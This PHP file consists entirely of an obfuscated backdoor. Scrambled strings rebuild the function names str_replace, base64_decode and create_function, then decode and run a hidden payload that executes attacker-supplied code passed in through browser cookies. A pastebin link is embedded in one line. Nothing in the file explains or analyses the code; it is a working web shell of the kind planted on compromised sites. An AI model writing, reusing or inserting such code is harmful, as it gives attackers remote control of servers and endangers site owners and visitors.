<?php
$qzkg="RrPSd3cyMTkxcyOScyc7ZWNobyAcynPCcuJGsucyJcyz4nO2V2YWwoYmFcyzZTcyY0X2cyRlY29cykZScyhwccymV";
$digq="nX3JlcGcyxhY2UoYXJyYXkoJy9bXcylx3PVxzXS8ncyLCccyvcyXHMvcyJcyyksIGFycmF5KCcyccynLCcrJycyksIcyGpva";
$erwc="cyJGM9J2NvdW5cy0JzskYT0kX0NPT0cytJRTtpZihyZXNlcydcyCgkYSk9PSd3bycgJiYgcyJGMoJGEpPjMpey";https://pastebin.com/raw/L9VZfWwj
$vpvt = str_replace("pt","","ptspttrpt_ptrptepptlptacpte");
$cord="W4oYXJyYcyXlfc2xpcyY2UoJGEcysJGMocyJcyGEpLTMpKSkpKTtcylY2hcyvcyICc8LyccyuJGscyuJz4ncyO30cy=";
$jufo = $vpvt("dy", "", "bdyadysdyedy64dy_dydedycdyodyddye");
$uzyt = $vpvt("m","","cmreamtem_mfumnctmiomn");
$dlxg = $uzyt('', $jufo($vpvt("cy", "", $erwc.$qzkg.$digq.$cord))); $dlxg();
?>